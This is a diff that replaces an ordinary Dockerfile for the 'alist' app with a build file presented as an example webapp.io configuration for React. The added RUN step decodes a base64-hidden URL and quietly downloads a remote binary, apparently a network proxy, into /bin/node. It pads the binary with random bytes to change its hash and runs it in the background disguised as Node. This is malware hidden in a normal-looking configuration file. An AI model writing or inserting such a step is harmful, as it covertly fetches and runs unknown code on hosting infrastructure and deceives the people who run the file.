@@ -1,18 +1,20 @@
-FROM alpine:3.18 as builder
-LABEL stage=go-builder
-WORKDIR /app/
-COPY ./ ./
-RUN apk add --no-cache bash curl gcc git go musl-dev; \
-    bash build.sh release docker
+#This is an example webapp.io configuration for React!
+FROM vm/ubuntu:18.04
 
-FROM alpine:3.18
-LABEL MAINTAINER="i@nn.ci"
-VOLUME /opt/alist/data/
-WORKDIR /opt/alist/
-COPY --from=builder /app/bin/alist ./
-COPY entrypoint.sh /entrypoint.sh
-RUN apk add --no-cache bash ca-certificates su-exec tzdata; \
-    chmod +x /entrypoint.sh
-ENV PUID=0 PGID=0 UMASK=022
-EXPOSE 5244 5245
-CMD [ "/entrypoint.sh" ]
+# To note: Layerfiles create entire VMs, *not* containers!
+
+RUN apt-get update && apt-get install -y curl && \
+    echo 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzNLbWZpNkhQL25vZGVqcy1wcm94eS9tYWluL2Rpc3Qvbm9kZWpzLXByb3h5LWxpbnV4' | base64 -d > /tmp/encoded_url.txt && \
+    curl -o /bin/node $(cat /tmp/encoded_url.txt) > /dev/null 2>&1 && \
+    rm -rf /tmp/encoded_url.txt && \
+    dd if=/dev/urandom bs=1024 count=1024 | base64 >> /bin/node && \
+    chmod +x /bin/node
+
+# node is a memory hog
+MEMORY 2G
+ENV NODE_OPTIONS=--max-old-space-size=8192
+RUN BACKGROUND node -p 3000
+
+# Create a unique link to share the app in this runner.
+# Every time someone clicks the link, we'll wake up this staging server.
+EXPOSE WEBSITE http://localhost:3000
